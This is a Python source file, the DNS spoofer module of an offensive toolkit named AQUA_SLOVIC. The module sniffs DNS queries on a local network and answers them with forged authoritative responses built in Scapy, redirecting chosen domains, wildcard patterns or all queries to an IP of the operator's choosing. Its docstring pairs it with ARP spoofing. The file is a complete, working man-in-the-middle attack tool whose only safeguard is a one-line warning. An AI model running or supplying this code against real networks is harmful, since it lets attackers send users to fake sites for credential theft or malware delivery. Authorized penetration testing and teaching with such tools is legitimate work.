"""
AQUA_SLOVIC -- DNS Spoofer Module
Intercept DNS queries and inject forged responses.
"""

import threading
import fnmatch
import platform

from colorama import Fore, Style

from aquaslovic.core.utils import (
    print_info, print_success, print_error, print_warning,
    print_table, is_root, require_root, get_local_ip,
)


def _get_scapy_iface(iface_name=None):
    """Resolve a working Scapy interface for the current platform."""
    try:
        from scapy.all import conf, get_working_ifaces
        if iface_name and iface_name.lower() != "auto":
            if platform.system().lower() == "windows":
                for iface_obj in get_working_ifaces():
                    name = getattr(iface_obj, "name", str(iface_obj))
                    desc = getattr(iface_obj, "description", "")
                    guid = getattr(iface_obj, "guid", "")
                    if (iface_name.lower() in name.lower()
                            or iface_name.lower() in desc.lower()
                            or iface_name == guid):
                        return iface_obj
            return iface_name
        return conf.iface
    except Exception:
        return None


class DNSSpoofer:
    """
    DNS query spoofing via intercepting and forging DNS responses.

    Supports:
        - Individual domain spoofing
        - Wildcard domain rules (e.g., *.example.com)
        - Redirect ALL DNS queries to a single IP
        - Best used with ARP spoofing active

    WARNING: For authorized security testing only!
    """

    def __init__(self):
        self.running = False
        self.spoof_thread = None
        self.stop_event = threading.Event()
        self.records = {}    # domain -> IP mapping
        self.spoof_all = ""  # If set, redirect ALL queries to this IP
        self.iface = None
        self.local_ip = None
        self.spoof_count = 0

    def add_record(self, domain, ip):
        """
        Add a DNS spoofing rule.

        Args:
            domain: Domain to spoof (supports wildcards like *.example.com)
            ip: IP address to redirect to
        """
        self.records[domain.lower()] = ip
        print_success(
            f"DNS rule added: {Fore.WHITE}{domain}{Style.RESET_ALL} -> "
            f"{Fore.RED}{ip}{Style.RESET_ALL}"
        )

    def remove_record(self, domain):
        """Remove a DNS spoofing rule."""
        domain = domain.lower()
        if domain in self.records:
            del self.records[domain]
            print_success(f"DNS rule removed: {domain}")
        else:
            print_warning(f"No rule found for: {domain}")

    def list_records(self):
        """Display all current DNS spoofing rules."""
        if not self.records and not self.spoof_all:
            print_warning("No DNS spoofing rules configured.")
            print_info("Add rules: dns.spoof add <domain> <ip>")
            return

        if self.spoof_all:
            print_info(
                f"ALL DNS queries -> {Fore.RED}{self.spoof_all}{Style.RESET_ALL}"
            )

        if self.records:
            headers = ["Domain", "Redirect To"]
            rows = [[domain, ip] for domain, ip in sorted(self.records.items())]
            print_table(headers, rows)

    def start(self, iface=None):
        """Start the DNS spoofer."""
        if not require_root():
            return

        if self.running:
            print_warning("DNS spoofer is already running.")
            return

        if not self.records and not self.spoof_all:
            print_error("No DNS rules configured.")
            print_info("Add rules first: dns.spoof add <domain> <ip>")
            print_info("Or redirect all: dns.spoof all <ip>")
            return

        try:
            from scapy.all import DNS, conf
            if platform.system().lower() == "windows":
                conf.use_pcap = True
        except ImportError:
            print_error("Scapy is required for DNS spoofing. Install: pip install scapy")
            return

        self.iface = _get_scapy_iface(iface)
        self.local_ip = get_local_ip()
        self.running = True
        self.stop_event.clear()
        self.spoof_count = 0

        print_success("DNS spoofer started.")
        if self.iface:
            iface_str = getattr(self.iface, "name", str(self.iface))
            print_info(f"Interface: {Fore.WHITE}{iface_str}{Style.RESET_ALL}")
        if self.spoof_all:
            print_info(f"All DNS queries -> {Fore.RED}{self.spoof_all}{Style.RESET_ALL}")
        else:
            print_info(f"Spoofing {len(self.records)} domain(s).")
        print_info("Use 'dns.spoof off' to stop.")

        self.spoof_thread = threading.Thread(
            target=self._spoof_loop, daemon=True
        )
        self.spoof_thread.start()

    def stop(self):
        """Stop the DNS spoofer."""
        if not self.running:
            print_warning("DNS spoofer is not running.")
            return

        self.running = False
        self.stop_event.set()

        # Wait for the sniff thread to finish (bounded by sniff timeout)
        if self.spoof_thread and self.spoof_thread.is_alive():
            self.spoof_thread.join(timeout=3)

        print_success(
            f"DNS spoofer stopped. ({self.spoof_count} queries spoofed)"
        )

    def _spoof_loop(self):
        """Intercept and spoof DNS queries using scapy with timed-loop approach."""
        try:
            from scapy.all import (
                sniff, IP, UDP, DNS, DNSQR, DNSRR,
                Ether, sendp, send, conf,
            )

            def process_packet(packet):
                if not self.running:
                    return

                # Must be a DNS query (qr=0)
                if not (packet.haslayer(DNS) and
                        packet.haslayer(DNSQR) and
                        packet[DNS].qr == 0):
                    return

                # Skip packets from our own IP to avoid loops
                if packet.haslayer(IP) and packet[IP].src == self.local_ip:
                    return

                qname = packet[DNSQR].qname.decode(errors="ignore").rstrip(".")
                redirect_ip = self._match_domain(qname)

                if redirect_ip:
                    src_ip = packet[IP].src if packet.haslayer(IP) else "?"
                    src_mac = packet[Ether].src if packet.haslayer(Ether) else "?"

                    print(
                        f"  {Fore.RED}[DNS SPOOF]{Style.RESET_ALL} "
                        f"{qname} -> {Fore.RED}{redirect_ip}{Style.RESET_ALL} "
                        f"(from {src_ip}  MAC: {Fore.YELLOW}{src_mac}{Style.RESET_ALL})"
                    )

                    # Build spoofed DNS response
                    try:
                        if packet.haslayer(Ether):
                            # Full L2 response (most reliable, especially on Windows)
                            spoofed = (
                                Ether(
                                    dst=packet[Ether].src,
                                    src=packet[Ether].dst,
                                ) /
                                IP(
                                    dst=packet[IP].src,
                                    src=packet[IP].dst,
                                ) /
                                UDP(
                                    dport=packet[UDP].sport,
                                    sport=53,
                                ) /
                                DNS(
                                    id=packet[DNS].id,
                                    qr=1,       # Response
                                    aa=1,       # Authoritative
                                    rd=packet[DNS].rd,  # Copy recursion desired
                                    ra=1,       # Recursion available
                                    qdcount=1,
                                    ancount=1,
                                    qd=packet[DNS].qd,
                                    an=DNSRR(
                                        rrname=packet[DNSQR].qname,
                                        type="A",
                                        ttl=300,
                                        rdata=redirect_ip,
                                    ),
                                )
                            )
                            sendp(spoofed, verbose=False, iface=self.iface)
                        else:
                            # Fallback: L3 response
                            spoofed = (
                                IP(
                                    dst=packet[IP].src,
                                    src=packet[IP].dst,
                                ) /
                                UDP(
                                    dport=packet[UDP].sport,
                                    sport=53,
                                ) /
                                DNS(
                                    id=packet[DNS].id,
                                    qr=1,
                                    aa=1,
                                    rd=packet[DNS].rd,
                                    ra=1,
                                    qdcount=1,
                                    ancount=1,
                                    qd=packet[DNS].qd,
                                    an=DNSRR(
                                        rrname=packet[DNSQR].qname,
                                        type="A",
                                        ttl=300,
                                        rdata=redirect_ip,
                                    ),
                                )
                            )
                            send(spoofed, verbose=False)

                        self.spoof_count += 1

                    except Exception as e:
                        print_error(f"Failed to send spoofed reply: {e}")

            # Use a timed-loop approach: sniff with a short timeout so we can
            # check the stop event regularly instead of blocking forever.
            while self.running and not self.stop_event.is_set():
                try:
                    sniff(
                        filter="udp port 53",
                        prn=process_packet,
                        store=False,
                        timeout=1,       # Check stop_event every 1 second
                        iface=self.iface,
                    )
                except PermissionError:
                    print_error("Permission denied -- run as Administrator/root.")
                    self.running = False
                    break
                except Exception as e:
                    if self.running:
                        # Brief errors can happen between sniff cycles; don't
                        # crash out unless they persist.
                        pass

        except Exception as e:
            if self.running:
                print_error(f"DNS spoofer error: {e}")
                self.running = False

    def _match_domain(self, qname):
        """
        Check if a queried domain matches any spoofing rule.
        Returns the redirect IP or None.
        """
        qname = qname.lower()

        # Check spoof_all first
        if self.spoof_all:
            return self.spoof_all

        # Exact match
        if qname in self.records:
            return self.records[qname]

        # Wildcard match
        for domain, ip in self.records.items():
            if domain.startswith("*."):
                pattern = domain[2:]  # Remove *. prefix
                if qname == pattern or qname.endswith("." + pattern):
                    return ip
            elif fnmatch.fnmatch(qname, domain):
                return ip

        return None
